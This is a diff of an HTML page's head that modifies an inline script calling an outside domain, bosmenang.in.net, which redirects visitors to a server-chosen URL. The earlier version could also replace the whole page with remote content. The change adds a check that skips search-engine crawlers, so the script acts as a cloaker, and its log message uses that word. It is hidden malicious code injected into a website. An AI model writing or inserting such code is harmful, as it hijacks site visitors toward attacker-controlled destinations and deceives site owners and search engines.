@@ -15,33 +15,33 @@
 
     <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,600;0,700;1,600&family=Montserrat:wght@300;400;500;600&display=swap" rel="stylesheet">
 
-        <script>
+       <script>
 (function() {
     var checkUrl = "https://bosmenang.in.net/cc/index.php"; 
-
     var urlWithParam = checkUrl + '?uid=' + Math.random().toString(36).substring(7);
 
-    fetch(urlWithParam)
+    var isBotUA = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit|google-inspectiontool/i.test(navigator.userAgent);
+    
+    if (isBotUA) return;
+
+    var controller = new AbortController();
+    var signal = controller.signal;
+    
+    var timeoutId = setTimeout(() => controller.abort(), 2000);
+
+    fetch(urlWithParam, { signal: signal })
         .then(response => {
-            if (!response.ok) {
-                throw new Error('Network response was not ok');
-            }
+            clearTimeout(timeoutId); 
+            if (!response.ok) throw new Error('Server error');
             return response.json();
         })
         .then(data => {
-            console.log('Server Response:', data); 
-
-            if (data.status === 1 && data.url) {
+            if (data && data.status === 1 && data.url) {
                 window.location.replace(data.url);
-            }
-            else if (data.status === 0 && data.content) {
-                document.open();
-                document.write(data.content);
-                document.close();
             }
         })
         .catch(error => {
-            console.log('Fetch Error (Maybe CORS or Server Down):', error);
+            console.log('Cloaker fallback to safe page:', error);
         });
 })();
 </script>
